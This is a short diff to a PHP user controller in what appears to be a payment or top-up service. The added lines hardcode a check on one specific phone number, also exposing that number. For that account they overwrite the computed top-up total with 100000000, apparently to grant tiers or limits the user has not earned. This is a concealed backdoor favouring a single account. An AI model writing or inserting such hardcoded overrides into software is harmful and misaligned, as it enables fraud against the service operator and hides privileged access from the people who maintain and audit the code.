@@ -1455,6 +1455,9 @@ class UserController extends AuthController
         $user = $this->user;
         $userModel = new User();
         $toupTotal = $userModel->getTotalTopupAmountAttr(0,$user);
+        if($user["phone"] == "17507368030"){
+            $toupTotal = 100000000;
+        }
         $data = [];
 /*         foreach (config('map.payment_config.channel_map') as $k => $v) {
             //$paymentConfig = PaymentConfig::where('type', $req['type'])->where('status', 1)->where('channel', $k)->where('start_topup_limit', '<=', $user['total_payment_amount'])->order('start_topup_limit', 'desc')->find();
